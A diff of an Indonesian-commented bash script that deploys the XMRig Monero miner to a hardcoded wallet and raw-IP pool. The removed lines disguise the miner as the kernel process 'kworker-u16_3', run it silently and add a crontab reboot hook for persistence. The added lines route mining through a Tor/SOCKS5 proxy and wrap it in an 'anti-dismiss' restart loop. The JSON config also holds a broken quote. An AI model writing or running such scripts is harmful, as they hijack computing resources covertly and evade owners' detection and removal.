@@ -1,64 +1,56 @@
 #!/bin/bash
 
-# === Pengaturan ===
-WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
-FAKE_NAME="kworker-u16_3"
-POOL="134.199.197.80:443"
-XM_DIR="$HOME/xmrig"
+### === SETUP === ###
+WORKDIR="$HOME/.xmrig_proxy"
+mkdir -p "$WORKDIR" && cd "$WORKDIR"
 
-# === Unduh XMRig terbaru ===
-mkdir -p "$XM_DIR"
-cd "$XM_DIR"
-wget https://github.com/xmrig/xmrig/releases/latest/download/xmrig-*-linux-x64.tar.gz -O xmrig.tar.gz
-tar -xf xmrig.tar.gz --strip-components=1
-rm xmrig.tar.gz
+ARCH=$(uname -m)
+if [[ "$ARCH" != "x86_64" ]]; then
+  echo "Hanya mendukung x86_64 (Ubuntu PC)"
+  exit 1
+fi
 
-# === Rename binary agar tersamarkan ===
-cp xmrig "$FAKE_NAME"
-chmod +x "$FAKE_NAME"
+# === Download XMRig jika belum ada ===
+if [ ! -f "./xmrig" ]; then
+  echo "[*] Mengunduh XMRig..."
+  curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
+  tar -xf xmrig.tar.gz --strip-components=1
+  rm xmrig.tar.gz
+  chmod +x xmrig
+fi
 
-# === Buat config.json anti-ban ===
+# === Konfigurasi USER ===
+WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"  # Ganti wallet kamu di sini
+PROXY="127.0.0.1:9050"    # SOCKS5 proxy, misalnya lewat Tor: 9050 atau SSH tunnel: 1080
+USE_PROXY=1               # 1=aktifkan proxy, 0=nonaktif
+
+# === Buat config.json ===
 cat > config.json <<EOF
 {
   "autosave": true,
-  "background": false,
-  "colors": false,
-  "randomx": {
-    "1gb-pages": false,
-    "rdmsr": false,
-    "wrmsr": false,
-    "numa": false
-  },
   "cpu": {
     "enabled": true,
-    "priority": 5,
-    "max-threads-hint": 85,
-    "yield": true
+    "priority": null,
+    "max-threads-hint": 0.7,   // BATASI 70% CPU
+    "asm": true
   },
-  "donate-level": 0,
-  "log-file": null,
   "pools": [
     {
-      "url": "$POOL",
+      "url": "159.65.167.171:443",
       "user": "$WALLET",
-      "pass": "x",
+      "pass": "ubuntu",
       "keepalive": true,
-      "tls": false
+      "tls": true",
+      "socks5": $( [ "$USE_PROXY" -eq 1 ] && echo "\"$PROXY\"" || echo "null" )
     }
-  ],
-  "print-time": 60,
-  "retries": 5,
-  "retry-pause": 10,
-  "syslog": false,
-  "user-agent": "$FAKE_NAME",
-  "watch": true
+  ]
 }
 EOF
 
-# === Jalankan miner di background ===
-nohup ./"$FAKE_NAME" --config=config.json > /dev/null 2>&1 &
-
-# === Tambahkan ke crontab untuk auto-start saat reboot ===
-(crontab -l 2>/dev/null; echo "@reboot cd $XM_DIR && nohup ./$FAKE_NAME --config=config.json > /dev/null 2>&1 &") | crontab -
-
-echo "[✔] Setup selesai. Mining sedang berjalan sebagai proses '$FAKE_NAME'"
+# === Jalankan Loop Anti-Dismiss ===
+while true; do
+  echo "[*] Menjalankan XMRig + TLS + $( [ "$USE_PROXY" -eq 1 ] && echo "SOCKS5 Proxy" || echo "No Proxy" )"
+  ./xmrig --config=config.json >> miner.log 2>&1
+  echo "[!] XMRig berhenti. Restart dalam 5 detik..."
+  sleep 5
+done
